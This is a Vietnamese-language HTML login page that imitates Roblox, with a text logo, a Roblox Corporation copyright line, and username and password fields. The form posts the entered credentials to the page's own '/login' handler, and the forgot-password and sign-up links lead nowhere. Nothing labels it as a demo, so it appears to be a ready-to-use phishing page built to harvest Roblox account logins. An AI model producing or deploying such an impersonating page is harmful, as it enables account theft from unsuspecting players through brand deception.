<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Đăng nhập – Roblox</title>
    <style>
        /* ===== RESET & FONT ===== */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', 'Roboto', Arial, sans-serif;
        }
        body {
            background: #1a1a2e;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            margin: 0;
        }
        /* ===== KHUNG ĐĂNG NHẬP ===== */
        .login-box {
            background: #ffffff;
            max-width: 420px;
            width: 100%;
            padding: 40px 35px;
            border-radius: 16px;
            box-shadow: 0 12px 40px rgba(0,0,0,0.6);
            text-align: center;
            transition: 0.3s;
        }
        /* ===== LOGO ROBLOX ===== */
        .logo {
            font-size: 38px;
            font-weight: 900;
            color: #1a1a2e;
            margin-bottom: 4px;
            letter-spacing: -0.5px;
        }
        .logo span {
            color: #e03a3a;
        }
        .subtitle {
            color: #666;
            font-size: 15px;
            margin-bottom: 28px;
            font-weight: 400;
        }
        /* ===== INPUT GROUP ===== */
        .input-group {
            margin-bottom: 18px;
            text-align: left;
        }
        .input-group label {
            font-size: 14px;
            font-weight: 600;
            color: #333;
            display: block;
            margin-bottom: 5px;
        }
        .input-group input {
            width: 100%;
            padding: 13px 16px;
            border: 1px solid #ccc;
            border-radius: 8px;
            font-size: 15px;
            background: #f9f9f9;
            transition: 0.2s;
            outline: none;
        }
        .input-group input:focus {
            border-color: #0070d1;
            background: #fff;
            box-shadow: 0 0 0 3px rgba(0,112,209,0.15);
        }
        /* ===== NÚT ĐĂNG NHẬP ===== */
        .btn-login {
            width: 100%;
            padding: 14px;
            background: #0070d1;
            color: #fff;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: 0.2s;
            margin-top: 6px;
        }
        .btn-login:hover {
            background: #005bb5;
        }
        .btn-login:active {
            transform: scale(0.97);
        }
        /* ===== LINK PHỤ ===== */
        .footer-links {
            margin-top: 22px;
            font-size: 13px;
            color: #555;
        }
        .footer-links a {
            color: #0070d1;
            text-decoration: none;
            font-weight: 500;
        }
        .footer-links a:hover {
            text-decoration: underline;
        }
        .footer-links .divider {
            color: #ccc;
            margin: 0 6px;
        }
        /* ===== THÔNG BÁO LỖI ===== */
        .error-msg {
            color: #d32f2f;
            font-size: 13px;
            margin-top: 8px;
            display: none;
            text-align: left;
            background: #ffebee;
            padding: 8px 12px;
            border-radius: 6px;
        }
        /* ===== COPYRIGHT ===== */
        .copyright {
            margin-top: 24px;
            font-size: 12px;
            color: #aaa;
            border-top: 1px solid #eee;
            padding-top: 16px;
        }
        /* ===== RESPONSIVE ===== */
        @media (max-width: 480px) {
            .login-box { padding: 30px 20px; }
            .logo { font-size: 30px; }
        }
    </style>
</head>
<body>

    <div class="login-box">
        <!-- Logo -->
        <div class="logo">R<span>o</span>blox</div>
        <div class="subtitle">Đăng nhập để tiếp tục</div>

        <!-- Form đăng nhập -->
        <form action="/login" method="POST" id="loginForm">
            <div class="input-group">
                <label for="username">Tên đăng nhập / Email</label>
                <input type="text" id="username" name="username" placeholder="Nhập tên đăng nhập hoặc email" required autofocus>
            </div>
            <div class="input-group">
                <label for="password">Mật khẩu</label>
                <input type="password" id="password" name="password" placeholder="Nhập mật khẩu" required>
            </div>

            <div id="errorDisplay" class="error-msg">⚠️ Sai tài khoản hoặc mật khẩu. Vui lòng thử lại.</div>

            <button type="submit" class="btn-login">Đăng nhập</button>
        </form>

        <!-- Link phụ -->
        <div class="footer-links">
            <a href="#">Quên mật khẩu?</a>
            <span class="divider">•</span>
            <a href="#">Đăng ký</a>
        </div>

        <div class="copyright">© 2026 Roblox Corporation</div>
    </div>

    <script>
        // ===== MÔ PHỎNG LỖI ĐĂNG NHẬP =====
        const form = document.getElementById('loginForm');
        const errorDisplay = document.getElementById('errorDisplay');
        const username = document.getElementById('username');
        const password = document.getElementById('password');

        form.addEventListener('submit', function(e) {
            const user = username.value.trim();
            const pass = password.value.trim();

            if (!user || !pass) {
                e.preventDefault();
                errorDisplay.style.display = 'block';
                errorDisplay.textContent = '⚠️ Vui lòng nhập đầy đủ tên đăng nhập và mật khẩu.';
                return;
            }

            // Nếu đã nhập đủ, cho phép submit (dữ liệu sẽ gửi về server)
            // Không hiển thị lỗi
            errorDisplay.style.display = 'none';
        });

        // Ẩn lỗi khi người dùng bắt đầu nhập
        username.addEventListener('input', function() {
            errorDisplay.style.display = 'none';
        });
        password.addEventListener('input', function() {
            errorDisplay.style.display = 'none';
        });
    </script>

</body>
  </html>
